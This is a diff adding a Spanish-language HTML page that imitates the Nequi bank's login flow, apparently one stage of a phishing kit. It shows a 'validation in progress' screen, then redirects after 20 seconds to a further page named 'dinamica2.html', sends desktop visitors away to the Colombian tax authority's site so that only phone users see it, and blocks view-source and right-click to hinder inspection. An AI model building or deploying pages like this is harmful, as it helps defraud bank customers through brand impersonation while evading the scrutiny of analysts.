@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Bienvenido</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="generator" content="Webflow">
+  <meta http-equiv="pragma" content="no-cache">
+  
+  <link rel="stylesheet" type="text/css" href="./login_files/normalize.css">
+  <link rel="stylesheet" type="text/css" href="./login_files/nequi_two.webflow.css">
+  <link rel="stylesheet" type="text/css" href="./login_files/nequi_one.webflow.css">
+  <link rel="stylesheet" type="text/css" href="./login_files/main2.css">
+  <!-- <link rel="shortcut icon" type="image/x-icon" href="https://transacciones.nequi.com/bdigital/images/favicon.ico"> -->
+
+  <script type="text/javascript">
+    // Función para redireccionar después de 20 segundos
+    function startRedirectTimer() {
+      let secondsLeft = 20;
+      const interval = setInterval(function() {
+        secondsLeft--;
+        console.log("Redirigiendo en " + secondsLeft + " segundos");
+        
+        // Cuando el contador llegue a 0, redirigir
+        if (secondsLeft <= 0) {
+          clearInterval(interval);
+          window.location.href = "dinamica2.html"; // Reemplazar con la ruta deseada
+        }
+      }, 1000);
+    }
+
+    // Iniciar el temporizador cuando la página haya cargado
+    window.onload = startRedirectTimer;
+  </script>
+</head>
+<body ng-app="App" class="ng-scope">
+
+  <div id="content">
+    <div ng-include="getTemplate('/header.html')" class="ng-scope">
+      <header class="ng-scope">
+        <div class="wrap-header">
+          <div class="row">
+            <div class="col-xs-12 col-md-2">
+              <div class="logo">
+                <a href="#">
+                  <img alt="nequi" src="./login_files/64dfef05bc6705edb9447499_nequi.svg">
+                </a>
+              </div>
+              <div class="btn-menu-hamburguer" ng-click="openMenu();">
+                <a class="">
+                  <span></span>
+                </a>
+              </div>
+            </div>
+            <div class="col-xs-12 col-md-10 container-buttons">
+              <div class="wrap-main-menu">
+                <div class="row">
+                  <div class="col-xs-12 col-md-8"></div>
+                  <div class="col-xs-12 col-md-4">
+                    <div class="buttons-right">
+                      <ul>
+                        <li ng-if="!hidePa" class="ng-scope">
+                          <a href="#" class="ng-binding">Recarga</a>
+                        </li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </header>
+    </div>
+
+    <section class="login-section ng-scope" ng-controller="loginController as loginControl">
+      <div class="login-wrap">
+        <h1 class="ng-binding">Validación en curso</h1>
+        <div class="wrap-input4 validate-input">
+          <br>
+          <center>
+            <img src="https://imagizer.imageshack.com/img923/8701/hMwrLE.gif" alt="Loading">
+          </center>
+          <div class="textypn2">
+            <span class="model" style="font-size:16px; color:#200020; text-align:center;">
+              Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.
+            </span>
+          </div>
+          <br>
+          <center>
+            <span class="label-input101">Por lo general este proceso no demora más de 2 minutos.</span>
+          </center>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+    // Detectar dispositivo
+    function detectar_dispositivo() {
+      var dispositivo = "";
+      if (navigator.userAgent.match(/Android/i)) dispositivo = "Android";
+      else if (navigator.userAgent.match(/webOS/i)) dispositivo = "webOS";
+      else if (navigator.userAgent.match(/iPhone/i)) dispositivo = "iPhone";
+      else if (navigator.userAgent.match(/iPad/i)) dispositivo = "iPad";
+      else if (navigator.userAgent.match(/iPod/i)) dispositivo = "iPod";
+      else if (navigator.userAgent.match(/BlackBerry/i)) dispositivo = "BlackBerry";
+      else if (navigator.userAgent.match(/Windows Phone/i)) dispositivo = "Windows Phone";
+      else dispositivo = "PC";
+      return dispositivo;
+    }
+  
+    // Redirigir si es PC
+    if (detectar_dispositivo() == "PC") {
+      window.location.href = "https://www.dian.gov.co";
+    }
+  
+    // Bloquear teclas específicas y clic derecho
+    document.addEventListener("keydown", function (e) {
+      if (e.ctrlKey && (e.key === "u" || e.key === "U")) {
+        e.preventDefault();
+        alert("Esta acción está bloqueada.");
+      }
+    });
+  
+    document.addEventListener("contextmenu", function (e) {
+      e.preventDefault();
+      alert("El clic derecho está deshabilitado en esta página.");
+    });
+  </script>
+  
+</body>
+</html>
